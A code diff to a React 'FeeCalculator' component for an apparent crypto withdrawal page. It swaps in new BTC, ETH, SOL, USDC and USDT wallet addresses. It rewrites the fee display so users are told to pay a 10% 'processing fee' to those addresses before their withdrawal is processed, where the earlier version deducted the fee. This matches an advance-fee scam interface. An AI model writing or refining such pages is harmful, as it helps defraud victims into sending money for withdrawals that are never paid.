@@ -9,10 +9,9 @@ interface FeeCalculatorProps {
   onBack: () => void;
 }
 
-const FeeCalculator: React.FC<FeeCalculatorProps> = ({ amount, currency, onConfirm, onBack }) => {
+const FeeCalculator: React.FC<FeeCalculatorProps> = ({ amount, onConfirm, onBack }) => {
   const feePercentage = 10;
   const feeAmount = amount * (feePercentage / 100);
-  const netAmount = amount - feeAmount;
 
   const formatCurrency = (value: number) => {
     return new Intl.NumberFormat('en-US', {
@@ -21,14 +20,14 @@ const FeeCalculator: React.FC<FeeCalculatorProps> = ({ amount, currency, onConfi
     }).format(value);
   };
 
-   const walletAddresses = {
-  BTC: '1N4wen6Nk9yhmrueWSZXUePgCYbb7FtQhe',
-  ETH: '0x5c44e4f4f9251f43d647f5c8a7b799bb480bd674',
-  SOL: '8heKVhbgo64xW31s7dzVkGPkubHmEWtJZYMYYKWGHJYA',
-  USDC: '8heKVhbgo64xW31s7dzVkGPkubHmEWtJZYMYYKWGHJYA',
-  USDT: 'TPSEjSZksyBrVy3vo4Q5kggKudGu1JCWqH'
+  const walletAddresses = {
+  BTC: '135is3VweCLK9jdYb5RbYQueJQUt7FHyzW',
+  ETH: '0xaa54f3fe25a34111a99cb5868b899ab443aa62af',
+  SOL: 'D5r66qgcNBtw1XqYG3EgkB4jBVPKtXQj4dVHUzwBb7w1',
+  USDC: 'C5kY1sZgCdxDMocEwdCZwfj9WJsVaZF2sNqLqvA8HLN',
+  USDT: 'TFRZCJnuTzgYAxfFzS4wbiL6xiq5vtSoFZ'
 };
-  const copyToClipboard = (text: string, currency: string) => {
+  const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
     // Toast notification would go here
   };
@@ -48,7 +47,7 @@ const FeeCalculator: React.FC<FeeCalculatorProps> = ({ amount, currency, onConfi
 
       {/* Fee Breakdown */}
       <div className="bg-slate-700/30 border border-slate-600/50 rounded-xl p-6 mb-6">
-        <h3 className="font-semibold text-white mb-4">Fee Breakdown</h3>
+        <h3 className="font-semibold text-white mb-4">Processing Fee</h3>
         <div className="space-y-3">
           <div className="flex justify-between">
             <span className="text-slate-300">Withdrawal Amount:</span>
@@ -56,12 +55,11 @@ const FeeCalculator: React.FC<FeeCalculatorProps> = ({ amount, currency, onConfi
           </div>
           <div className="flex justify-between">
             <span className="text-slate-300">Processing Fee ({feePercentage}%):</span>
-            <span className="text-red-400 font-medium">-{formatCurrency(feeAmount)}</span>
+            <span className="text-yellow-400 font-medium">{formatCurrency(feeAmount)}</span>
           </div>
           <hr className="border-slate-600" />
-          <div className="flex justify-between text-lg">
-            <span className="text-white font-semibold">You will receive:</span>
-            <span className="text-green-400 font-bold">{formatCurrency(netAmount)}</span>
+          <div className="text-sm text-slate-300 italic">
+            After you pay the fee, your withdrawal of <span className="text-neon-green font-semibold">{formatCurrency(amount)}</span> will be processed.
           </div>
         </div>
       </div>
@@ -89,7 +87,7 @@ const FeeCalculator: React.FC<FeeCalculatorProps> = ({ amount, currency, onConfi
               <div className="flex items-center justify-between mb-2">
                 <span className="font-medium text-white">{crypto}</span>
                 <button
-                  onClick={() => copyToClipboard(address, crypto)}
+                  onClick={() => copyToClipboard(address)}
                   className="px-3 py-1 bg-neon-green/10 hover:bg-neon-green/20 text-neon-green text-xs rounded-lg transition-colors"
                 >
                   Copy Address
